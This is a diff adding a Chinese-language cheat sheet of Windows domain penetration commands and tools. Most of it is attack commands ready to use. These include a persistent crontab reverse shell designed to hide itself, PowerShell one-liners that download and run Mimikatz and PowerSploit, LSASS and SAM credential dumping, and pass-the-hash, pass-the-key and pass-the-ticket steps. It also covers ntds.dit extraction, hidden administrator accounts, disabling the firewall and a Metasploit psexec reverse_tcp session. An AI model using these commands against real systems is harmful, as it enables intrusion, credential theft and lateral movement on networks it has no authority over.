@@ -1,1 +1,379 @@
+域渗透常用命令&工具
+
+    query user || qwinsta 查看当前在线用户
+
+    net user 查看本机用户
+
+    net user /domain 查看域用户
+
+    net view & net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多
+
+    net view /domain 查看有几个域
+
+    net view \\\\dc 查看 dc 域内共享文件
+
+    net group /domain 查看域里面的组
+
+    net group "domain admins" /domain 查看域管
+
+    net localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管
+
+    net group "domain controllers" /domain 域控
+
+    net time /domain net config workstation 当前登录域 - 计算机名 - 用户名
+
+    net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源
+
+    ipconfig
+
+    systeminfo
+
+    tasklist /svc
+
+    tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist
+
+    net localgroup administrators && whoami 查看当前是不是属于管理组
+
+    netstat -ano nltest /dclist:xx 查看域控
+
+    whoami /all 查看 Mandatory Label uac 级别和 sid 号
+
+    net sessoin 查看远程连接 session (需要管理权限)
+
+    net share 共享目录
+
+    cmdkey /l 查看保存登陆凭证
+
+    echo %logonserver% 查看登陆域
+
+    spn –l administrator spn 记录 set 环境变量
+
+    dsquery server - 查找目录中的 AD DC/LDS 实例
+
+    dsquery user - 查找目录中的用户
+
+    dsquery computer 查询所有计算机名称
+
+    windows 2003 dir /s *.exe 查找指定目录下及子目录下没隐藏文件
+
+    arp -a
+
+    ping     icmp 连通性
+
+    nslookup www.baidu.com vps-ip dns 连通性
+
+    dig @vps-ip www.baidu.com
+
+    curl vps:8080 http 连通性
+
+    tracert
+
+    bitsadmin /transfer n http://ip/xx.exe C:\windows\temp\x.exe一种上传文件 >= 2008
+
+    fuser -nv tcp 80 查看端口 pid
+
+    rdesktop -u username ip linux 连接 win 远程桌面 (有可能不成功)
+
+    where file win 查找文件是否存在
+
+    找路径，Linux 下使用命令 find -name *.jsp 来查找，Windows 下，使用 for /r
+
+    c:\windows\temp\ %i
+
+    in (file lsss.dmp) do @echo %i
+
+    netstat -apn | grep 8888 kill -9 PID 查看端口并 kill
+远程登录内网主机
+
+判断是内网，还是外网，内网转发到 vps
+
+    netstat -ano 没有开启 3389 端口,复查下
+
+    tasklist /svc,查 svchost.exe 对应的 TermService 的 pid,看 netstat 相等的 pid 即 3389 端口.
+
+在主机上添加账号
+
+    net user admin1 admin1 /add & net localgroup administrators admin1 /add
+
+如不允许远程连接，修改注册表
+
+    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f
+
+如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许 3389 端口，命令如下:
+
+    netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
+
+关闭防火墙
+
+    netsh firewall set opmode mode=disable
+
+3389user 无法添加:
+
+    http://www.91ri.org/5866.html
+
+**隐藏 win 账户**
+
+开启 sys 权限 cmd:
+
+    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'
+
+add user 并隐藏:
+
+    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1')
+
+win server 有密码强度要求，改为更复杂密码即可:
+
+渗透技巧——Windows 系统的帐户隐藏
+
+    https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/
+
+windows 的 RDP 连接记录:
+
+    http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/
+
+linux bash
+
+    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+`bash -i` 交互的 shell
+
+`&` 标准错误输出到标准输出
+
+`/dev/tcp/10.0.0.1/8080` 建立 socket ip port
+
+`0>&1` 标准输入到标准输出
+
+    (crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/IP/port;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -
+
+猥琐版
+
+    (crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/IP/PORT;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n")|crontab -
+远程命令执行
+
+    at\schtasks\psexec\wmic\sc\ps
+
+2012 r2 起,默认端口 5985,系统自带远程管理 winrs
+
+    winrs -r:192.168.1.100 -u:administrator -p:pwd ipconfig
+
+这里 schtasks 用着很舒服，
+
+    schtasks /create /tn mytask /tr F:\Desktop.exe /sc minute /mo 1 每分运行1次
+
+如果程序有参数用引号
+
+    "C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp"
+
+`/RU` 可以以 system 启动，例如
+
+    schtasks /Create /TN test /SC DAILY /ST 00:09 /TR notepad.exe /RU SYSTEM
+
+    schtasks /create /tn mytask /tr "C:\procdump64.exe -accepteula -ma lsass.exe lsass.dmp" /sc minute /mo 2
+
+    schtasks /Query /TN mytask
+
+    net time
+
+    schtasks /Query /TN mytask
+
+    schtasks /Delete /TN mytask /F
+
+mimikatz + procdump 获得内存 hash
+
+如果服务器是 64 位，要把 Mimikatz 进程迁移到一个 64 位的程序进程中，才能查看 64 位系统密码明文。32 位任意
+
+运行
+
+    procdump.exe -accepteula -ma lsass.exe lsass.dmp(管理权限)
+
+后 lsass.dmp 放到 mimikatz.exe 同目录，运行以下命令
+
+    mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
+
+导出当前
+
+    mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
+
+    powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+
+Windows Server 2012, 部分 Windows Server 2008 默认无法使用 mimikatz 导出明文口令
+
+解决方法：启用 Wdigest Auth, cmd:
+
+    reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+
+powershell:
+
+    Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
+
+重启或者用户再次登录，能够导出明文口令, 参考下文：
+
+3gstudent 自动Dump-Clear-Text-Password-after-KB2871997-installed
+
+    https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed
+
+SAM-hash
+
+管理权限：
+
+    reg save HKLM\SYSTEM Sys.hiv reg save HKLM\SAM Sam.hiv
+
+mimikatz:
+
+    lsadump::sam /sam:Sam.hiv /system:Sys.hiv
+
+pass the hash
+
+wmiexec 普通权限即可
+
+    https://github.com/maaaaz/impacket-examples-window
+
+    domain=TEST user=test1 wmiexec -hashes 00000000000000000000000000000000:99b2b135c9e829367d9f07201b1007c3 TEST/test1@192.168.1.1 "whoami"
+
+需要管理权限
+
+    mimikatz "privilege::debug" "sekurlsa::pth /user:abc /domain:test.local /ntlm:hash"
+
+    meterpreter > run post/windows/gather/hashdump
+
+    meterpreter > background
+
+    msf > use exploit/windows/smb/psexec
+
+    msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+
+    msf exploit(psexec) > set SMBuser Administrator
+
+    msf exploit(psexec) > set SMBPass xxxxxxxxxxxx9a224a3b108f3fa6cb6d:xxxxf7eaee8fb117ad06bdd830b7586c
+
+    msf exploit(psexec) > exploit
+
+    meterpreter > shell
+
+安装了 KB2871997 补丁或者系统版本大于等于 windows server 2012 时，内存不再明文保存密码，1,改注册表后，注销再次登录，可以使用，schtasks 等执行命令无法用管理员权限。2.用 ptk，ptt。例外，打补丁后 administrato（SID-500） 依旧可以pth
+
+    https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/
+
+pass the key
+
+需要免杀：
+
+    mimikatz "privilege::debug" "sekurlsa::ekeys" 获取用户的aes key
+
+    mimikatz "privilege::debug" "sekurlsa::pth /user:a /domain:test.local /aes256:asdq379b5b422819db694aaf78f49177ed21c98ddad6b0e246a7e17df6d19d5c" 注入aes key
+
+    dir \\\计算机名
+
+pass the ticket
+
+不需要管理员权限
+
+    kekeo "tgt::ask /user:abc /domain:test.local /ntlm:hash"
+
+导入ticket：
+
+    kekeo "kerberos::ptt TGT_abc@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi"
+
+程序地址：
+
+    https://github.com/gentilkiwi/kekeo
+
+ntds.dit
+
+vssadmin 方法 >= win 2008
+
+查询当前系统的快照
+
+    vssadmin list shadows
+
+创建快照
+
+    vssadmin create shadow /for=c: 获得 Shadow Copy Volume Name 为 `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47`
+
+复制 ntds.dit, copy 第一个参数为创建快照时位置:
+
+    copy \\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\NTDS\ntds.dit c:\ntds.dit
+
+复制 system 和 sam
+
+    copy \\\?
+
+    \GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\system32\config\system c:\
+
+    copy \\\?
+
+    \GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\system32\config\sam c:\
+
+删除快照
+
+    vssadmin delete shadows /for=c: /quiet
+
+获取将以上 system，sam, ntds.dit 放到 /root/ntds_cracking/ 下，运行
+
+    python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/SYSTEM LOCAL
+
+py 地址:
+
+    https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py
+
+域渗透——获得域控服务器的 NTDS.dit 文件
+
+    http://www.4hou.com/technology/10573.html
+
+dc 定位
+
+    nltest dclist:xx.xx
+
+    net time /domain
+
+    systeminfo 中的 domain
+
+    ipconfig /all 中的 DNS
+
+    Suffix Search List
+
+    扫描53端口，找 dns 位置
+
+    set log
+
+    net group "domain controllers" /domain
+
+    PowerView Get-NetDomainController
+
+PowerView 地址:
+
+    https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+
+windows log
+
+微软第三方信息收集工具 LogParser.exe psloglist.exe 等
+powerhsell 神器
+
+nishang
+
+    https://github.com/samratashok/nishang
+
+spn扫描
+
+    https://github.com/nullbind/Powershellery/tree/master/Stable-ish
+
+PowerSploit
+
+    https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+
+针对ps的Empire
+
+    https://github.com/EmpireProject/Empire
+
+ipc$
+
+    D:>net use \\\192.168.1.254\c$ "pwd" /user:user //连接192.168.1.254的IPC$共享，用unc路径
+
+    D:>copy srv.exe \\\192.168.1.254\c$ //复制本地 srv.exe 到C根目录
+
+    D:>net time \\\192.168.1.254 //查时间
+
+    D:>at　\\\192.168.1.254 10:50 srv.exe //用at命令在10点50分启动 srv.exe (这里360会拦截)
+
+    D:>net use \\\192.168.1.254\c$ /del
 
